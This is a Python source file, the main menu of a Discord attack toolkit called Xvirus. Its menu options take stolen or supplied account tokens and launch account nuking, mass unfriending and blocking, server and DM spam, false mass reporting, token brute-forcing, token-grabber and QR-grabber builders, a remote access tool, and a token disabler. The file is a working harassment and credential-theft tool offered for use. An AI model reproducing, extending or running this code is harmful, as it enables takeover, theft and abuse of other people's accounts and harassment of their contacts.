import asyncio
import util.accountNuke
import util.dmdeleter
import util.friend_blocker
import util.groupchat_spammer
import util.info
import util.login
import util.massdm
import util.massreport
import util.profilechanger
import util.qrgrabb
import util.seizure
import util.server_leaver
import util.spamservers
import util.tokendisable
import util.unfriender
import util.vanitysniper
import util.webhookspammer
from util.plugins.common import *
from util.webhookgen import *

threads = 3
cancel_key = "ctrl+x"
current_dir = os.path.dirname(os.path.abspath(__file__))

script_path = os.path.abspath(sys.argv[0])
script_dir = os.path.dirname(script_path)

rat_path = os.path.join(script_dir, 'util', 'rat.py')
vanitysniper_path = os.path.join(script_dir, 'util', 'vanitysniper.py')
dmclear_path = os.path.join(script_dir, 'util', 'dmclear.py')
nitrogen_path = os.path.join(script_dir, 'util', 'nitrogen.py')
linkgen_path = os.path.join(script_dir, 'util', 'linkgen.py')
           
def main():
    setTitle(f"Xvirus {THIS_VERSION}")
    clear()
    global threads
    global cancel_key
    if getTheme() == "xeme":
        banner()
    elif getTheme() == "dark":
        banner("dark")
    elif getTheme() == "fire":
        banner("fire")
    elif getTheme() == "aqua":
        banner("aqua")
    elif getTheme() == "neon":
        banner("neon")

    choice = input(f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}{username}: {Fore.RED}').lstrip("0")
    choice = choice.upper()
    #all options
    if choice == "1":
        token = input(
            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
        validateToken(token)
        Server_Name = str(input(
            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Name of the servers that will be created: {Fore.RED}'))
        message_Content = str(input(
            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Message that will be sent to every friend: {Fore.RED}'))
        if threading.active_count() < threads:
            threading.Thread(target=util.accountNuke.Xvirus_Nuke, args=(token, Server_Name, message_Content)).start()
            return


    elif choice == '2':
        token = input(
            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
        validateToken(token)
        #get all friends
        processes = []
        friendIds = requests.get("https://discord.com/api/v10/users/@me/relationships", proxies={"http": f'{proxy()}'}, headers=getheaders(token)).json()
        for friend in [friendIds[i:i+3] for i in range(0, len(friendIds), 3)]:
            t = multiprocessing.Process(target=util.unfriender.UnFriender, args=(token, friend))
            t.start()
            processes.append(t)
        while True:
            if keyboard.is_pressed(cancel_key):
                for process in processes:
                    process.terminate()
                main()
                break


    elif choice == '3':
        token = input(
            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
        validateToken(token)
        if token.startswith("mfa."):
            print(f'[{Fore.RED}Error] : Just a headsup Xvirus wont be able to delete the servers since the account has 2fa enabled')
            sleep(3)
        processes = []
        #get all servers
        guildsIds = requests.get("https://discord.com/api/v10/users/@me/guilds", headers=getheaders(token)).json()
        for guild in [guildsIds[i:i+3] for i in range(0, len(guildsIds), 3)]:
            t = multiprocessing.Process(target=util.server_leaver.Leaver, args=(token, guild))
            t.start()
            processes.append(t)
        while True:
            if keyboard.is_pressed(cancel_key):
                for process in processes:
                    process.terminate()
                main()
                break
                

    elif choice == '4':
        token = input(f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] Token: {Fore.RED}')
        validateToken(token)
        print(f'{Fore.BLUE}Do you want to have an icon for the servers that will be created?')
        yesno = input(f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] yes/no: {Fore.RED}')
        
        if yesno.lower() == "yes":
            image = input(f'Example: (C:\\Users\\myName\\Desktop\\Xvirus\\ShitOn.png):\n{Fore.RED}[{Fore.RED}>>>{Fore.RED}] Please input the icon location: {Fore.RED}')
            if not os.path.exists(image):
                print(f'[{Fore.RED}Error] : Couldn\'t find "{image}" on your PC')
                sleep(3)
                main()
            
            with open(image, "rb") as f:
                _image = f.read()
            b64Bytes = base64.b64encode(_image)
            icon = f"data:image/x-icon;base64,{b64Bytes.decode()}"
        else:
            icon = None
        
        print(f'''
    [{Fore.RED}1] Random server names
    [{Fore.RED}2] Custom server names  
                        ''')
        secondchoice = input(f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] Second Choice: {Fore.RED}')
        
        if secondchoice not in ["1", "2"]:
            print(f'[{Fore.RED}Error] : Invalid Second Choice')
            sleep(1)
            main()
        
        if secondchoice == "1":
            processes = []
            for i in range(25):
                t = multiprocessing.Process(target=util.spamservers.SpamServers, args=(token, icon))
                t.start()
                processes.append(t)
            while True:
                if keyboard.is_pressed(cancel_key):
                    for process in processes:
                        process.terminate()
                    main()
                    break

        if secondchoice == "2":
            name = str(input(
                f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] Name of the servers that will be created: {Fore.RED}'))
            processes = []
            for i in range(25):
                t = multiprocessing.Process(target=util.spamservers.SpamServers, args=(token, icon, name))
                t.start()
                processes.append(t)
            while True:
                if keyboard.is_pressed(cancel_key):
                    for process in processes:
                        process.terminate()
                    main()
                    break

    elif choice == '5':
        token = input(
            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
        validateToken(token)
        processes = []
        channelIds = requests.get("https://discord.com/api/v10/users/@me/channels", headers=getheaders(token)).json()
        for channel in [channelIds[i:i+3] for i in range(0, len(channelIds), 3)]:
                t = multiprocessing.Process(target=util.dmdeleter.DmDeleter, args=(token, channel))
                t.start()
                processes.append(t)
        while True:
            if keyboard.is_pressed(cancel_key):
                for process in processes:
                    process.terminate()
                main()
                break


    elif choice == '6':
        token = input(
            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
        validateToken(token)
        message = str(input(
            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Message that will be sent to every friend: {Fore.RED}'))
        processes = []
        channelIds = requests.get("https://discord.com/api/v10/users/@me/channels", headers=getheaders(token)).json()
        for channel in [channelIds[i:i+3] for i in range(0, len(channelIds), 3)]:
            t = multiprocessing.Process(target=util.massdm.MassDM, args=(token, channel, message))
            t.start()
            processes.append(t)
        while True:
            if keyboard.is_pressed(cancel_key):
                for process in processes:
                    process.terminate()
                main()
                break


    elif choice == '7':
        token = input(
            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
        validateToken(token)
        print(f'{Fore.MAGENTA}Starting seizure mode {Fore.WHITE}(Switching on/off Light/dark mode)\n')
        processes = [] 
        for i in range(threads):
            t = multiprocessing.Process(target=util.seizure.StartSeizure, args=(token, ))
            t.start()
            processes.append(t)
        while True:
            if keyboard.is_pressed(cancel_key):
                for process in processes:
                    process.terminate()
                main()
                break


    elif choice == '8':
        print_slow(f"{Fore.BLUE}If the discriminator says #0 that means the the user has the new username system,\nand you would need to add them by using only the username\n")
        token = input(
        f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
        validateToken(token)
        util.info.Info(token)


    elif choice == '9':
        token = input(
            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
        validateToken(token)
        util.login.TokenLogin(token)

    elif choice == '10':
        token = input(
            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
        validateToken(token)
        processes = []
        friendIds = requests.get("https://discord.com/api/v10/users/@me/relationships", proxies={"http": f'{proxy()}'}, headers=getheaders(token)).json()
        for friend in [friendIds[i:i+3] for i in range(0, len(friendIds), 3)]:
            t = multiprocessing.Process(target=util.friend_blocker.Block, args=(token, friend))
            t.start()
            processes.append(t)
        while True:
            if keyboard.is_pressed(cancel_key):
                for process in processes:
                    process.terminate()
                main()
                break


    elif choice == '11':
        token = input(
            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
        validateToken(token)
        print(f'''
    [{Fore.RED}1] Status changer
    [{Fore.RED}2] Bio changer
    [{Fore.RED}3] HypeSquad changer    
                        ''')
        secondchoice = input(
            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Setting: {Fore.RED}')
        if secondchoice not in ["1", "2", "3"]:
            print(f'[{Fore.RED}Error] : Invalid choice')
            sleep(1)
            main()
        if secondchoice == "1":
            status = input(
                f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Custom Status: {Fore.RED}')
            util.profilechanger.StatusChanger(token, status)

        if secondchoice == "2":
            bio = input(
                f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Custom bio: {Fore.RED}')
            util.profilechanger.BioChanger(token, bio)

        if secondchoice == "3":
            print(f'''
        [{Fore.MAGENTA}1]{Fore.MAGENTA} HypeSquad Bravery
        [{Fore.RED}2]{Fore.LIGHTRED_EX} HypeSquad Brilliance
        [{Fore.LIGHTGREEN_EX}3]{Fore.LIGHTGREEN_EX} HypeSquad Balance
                        ''')
            thirdchoice = input(
                f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Hypesquad: {Fore.RED}')
            if thirdchoice not in ["1", "2", "3"]:
                print(f'[{Fore.RED}Error] : Invalid choice')
                sleep(1)
                main()
            if thirdchoice == "1":
                util.profilechanger.HouseChanger(token, 1)
            if thirdchoice == "2":
                util.profilechanger.HouseChanger(token, 2)
            if thirdchoice == "3":
                util.profilechanger.HouseChanger(token, 3)


    elif choice == '12':
        exec(open(os.path.join(script_dir, 'util', 'tokenbrute.py')).read())

    elif choice == '13':
        exec(open(os.path.join(script_dir, 'util', 'grabberbuilder.py')).read())

    elif choice == '14':
        WebHook = input(
            f'{Fore.RED}[>>>] Webhook Url: {Fore.RED}')
        validateWebhook(WebHook)
        util.qrgrabb.QR_Grabber(WebHook)

    elif choice == '15':
        print(f"\n{Fore.RED}(the token you input is the account that will send the reports)")
        token = input(f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
        validateToken(token)
    
        guild_id = str(input(f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Server ID: {Fore.RED}'))
        channel_id = str(input(f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Channel ID: {Fore.RED}'))
        message_id = str(input(f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Message ID: {Fore.RED}'))
    
        print('\n[1] Illegal content')
        print('[2] Harassment')
        print('[3] Spam or phishing links')
        print('[4] Self-harm')
        print('[5] NSFW content\n')
    
        reason = str(input(f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Reason: {Fore.RED}'))
    
        if reason.upper() in ('1', 'ILLEGAL CONTENT'):
            reason = 0
        elif reason.upper() in ('2', 'HARASSMENT'):
            reason = 1
        elif reason.upper() in ('3', 'SPAM OR PHISHING LINKS'):
            reason = 2
        elif reason.upper() in ('4', 'SELF-HARM'):
            reason = 3
        elif reason.upper() in ('5', 'NSFW CONTENT'):
            reason = 4
        else:
            print(f"\nInvalid reason")
            sleep(1)
            main()
            util.massreport.MassReport(token, guild_id1, channel_id1, message_id1, reason1)


    elif choice == "16":
        token = input(
            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
        validateToken(token)
        util.groupchat_spammer.GcSpammer(token)


    elif choice == '17':
        print(f'''
    [{Fore.RED}1] Webhook Deleter
    [{Fore.RED}2] Webhook Spammer    
                        ''')
        secondchoice = int(input(
            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Second Choice: {Fore.RED}'))
        if secondchoice not in [1, 2]:
            print(f'[{Fore.RED}Error] : Invalid Second Choice')
            sleep(1)
            main()
        if secondchoice == 1:
            WebHook = input(
                f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Webhook: {Fore.RED}')
            validateWebhook(WebHook)
            try:
                requests.delete(WebHook)
                print(f'\n{Fore.GREEN}Webhook Successfully Deleted!\n')
            except Exception as e:
                print(f'{Fore.RED}Error: {Fore.WHITE}{e} {Fore.RED}happened while trying to delete the Webhook')

            input(f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Enter anything to continue. . . {Fore.RED}')
            main()
        if secondchoice == 2:
            WebHook = input(
                f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Webhook: {Fore.RED}')
            validateWebhook(WebHook)
            Message = str(input(
                f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Message: {Fore.RED}'))
            util.webhookspammer.WebhookSpammer(WebHook, Message)

    elif choice == '18':
        exec(open(os.path.join(script_dir, 'util', 'tokenchecker.py')).read())

    elif choice == '19':
        TokenDisable()

    elif choice == '20':
        exec(open(rat_path).read())

    elif choice == '21':
        exec(open(vanitysniper_path).read())

    elif choice == '22':
        exec(open(dmclear_path).read())

    elif choice == '23':
        exec(open(nitrogen_path).read())

    elif choice == '24':
        exec(open(linkgen_path).read())

    elif choice == '25':
        generate_and_save_valid_webhook()

    elif choice == '26':
        print_slow(f"\n{Fore.RED}(This option is still WIP it will be included in one of the next updates.)")
        sleep(1)
        main()

    elif choice == '27':
        print_slow(f"\n{Fore.RED}(This option is still WIP it will be included in one of the next updates.)")
        sleep(1)
        main()

    elif choice == '?':
        CHANGE_LOG()
        main()

    elif choice == 'ai':
        exec(open('util/gpt.py', encoding='utf-8').read())
        main()

    elif choice == 'TM':
            print(f"""                                            Development Networks:\n\n                                                GitHub:    @DXVVAY, @Xvirus0, @Cwackz(Benjamin)\n\n\n                                            Other Networks\n\n                                                Twitter:   @DXVVAY\n                                                Discord:   @dexv, @danskespil\n\n\n\n""")
            input("Press Enter To Exit!")
            main()
    
    elif choice == 'PING':
        if keyboard.is_pressed(cancel_key):
            print(f"Press {cancel_key} to stop")
        ping("google.com")
        input("Press Enter To Exit!")
        main()
    
    elif choice == 'UPD':
        update()

    # this is end settings
    elif choice == '!':
        print(f'''
        {Fore.BLUE}[{Fore.RED}1{Fore.BLUE}] Theme changer
        {Fore.BLUE}[{Fore.RED}2{Fore.BLUE}] Change Username
        {Fore.BLUE}[{Fore.RED}3{Fore.BLUE}] Amount of threads
        {Fore.BLUE}[{Fore.RED}4{Fore.BLUE}] Cancel key
        {Fore.BLUE}[{Fore.RED}5{Fore.BLUE}] {Fore.RED}Exit...    
                        ''')
        secondchoice = input(
            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Setting: {Fore.RED}')
        if secondchoice not in ["1", "2", "3", "4", "5"]:
            print(f'[{Fore.RED}Error] : Invalid Setting')
            sleep(1)
            main()
        if secondchoice == "1":
            print(f"""
        {Fore.RED}Xeme: 1
        {Fore.LIGHTBLACK_EX}Dark: 2
        {Fore.YELLOW}Fire: 3
        {Fore.BLUE}Aqua: 4
        {Fore.CYAN}N{Fore.MAGENTA}e{Fore.CYAN}o{Fore.MAGENTA}n{Fore.CYAN}:{Fore.MAGENTA} 5""")
            themechoice = input(
                f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}theme: {Fore.RED}')
            if themechoice == "1":
                setTheme('xeme')
            elif themechoice == "2":
                setTheme('dark')
            elif themechoice == "3":
                setTheme('fire')
            elif themechoice == "4":
                setTheme('aqua')
            elif themechoice == "5":
                setTheme('neon')
            else:
                print(f'[{Fore.RED}Error] : Invalid Theme')
                sleep(1.5)
                main()
            print_slow(f"{Fore.RED}Theme set to {Fore.BLUE}{getTheme()}")
            sleep(0.5)
            main()

        elif secondchoice == "2":
            new_username = input(f'{Fore.BLUE}Enter your new username: ')
            setUsername(new_username)
            print_slow(f"{Fore.RED}Username set to {Fore.BLUE}{new_username}\n{Fore.RED}Restarting tool")
            sleep(2)
            subprocess.run("start.bat", shell=True)
            exit()


        elif secondchoice == "3":
            print(f"{Fore.BLUE}Current amount of threads: {threads}")
            try:
                amount = int(
                    input(f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Amount of threads: {Fore.RED}'))
            except ValueError:
                print(f'[{Fore.RED}Error] : Invalid amount')
                sleep(1.5)
                main()
            if amount >= 45:
                print(f"{Fore.RED}Sorry but having this many threads will just get you ratelimited and not end up well")
                sleep(3)
                main()
            elif amount >= 15:
                print(f"{Fore.RED}WARNING! * WARNING! * WARNING! * WARNING! * WARNING! * WARNING! * WARNING!")
                print(f"having the thread amount set to 15 or over can possible get laggy and higher chance of ratelimit\nare you sure you want to set the ratelimit to {Fore.YELLOW}{amount}{Fore.RED}?")
                yesno = input(f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}yes/no: {Fore.RED}')
                if yesno.lower() != "yes":
                    sleep(0.5)
                    main()
            threads = amount
            print_slow(f"{Fore.GREEN}Threads set to {Fore.CYAN}{amount}")
            sleep(0.5)
            main()
        
        elif secondchoice == "4":
            print("\n","Info".center(30, "-"))
            print(f"{Fore.CYAN}Current cancel key: {cancel_key}")
            print(f"""{Fore.BLUE}If you want to have ctrl + <key> you need to type out ctrl+<key> | DON'T literally press ctrl + <key>
        {Fore.GREEN}Example: shift+Q

        {Fore.RED}You can have other modifiers instead of ctrl ⇣
        {Fore.YELLOW}All keyboard modifiers:
        ctrl, shift, enter, esc, windows, left shift, right shift, left ctrl, right ctrl, alt gr, left alt, right alt
        """)
            sleep(1.5)
            key = input(f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Key: {Fore.RED}')
            cancel_key = key
            print_slow(f"{Fore.GREEN}Cancel key set to {Fore.CYAN}{cancel_key}")
            sleep(0.5)
            main()

        elif secondchoice == "5":
            setTitle("Exiting. . .")
            choice = input(
                f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Are you sure you want to exit? (Y to confirm): {Fore.RED}')
            if choice.upper() == 'Y':
                clear()
                os._exit(0)
            else:
                main()
    else:
        clear()
        main()

if __name__ == "__main__":
    import sys
    setTitle("Xvirus Loading...")
    System.Size(120, 28)
    search_for_updates()
    get_username()
    Anime.Fade(Center.Center(startuplogo), Colors.rainbow, Colorate.Vertical, time=2)
    check_version()
    proxy_file = os.getenv("temp") + "\\xvirus_proxies"
    if not os.path.exists(proxy_file):
        proxy_scrape()
    with open(os.getenv("temp") + "\\xvirus_proxies", 'w'):
        pass
    if not os.path.exists(os.getenv("temp") + "\\xvirus_theme"):
        setTheme('xeme')
    sleep(1.5)
    main()

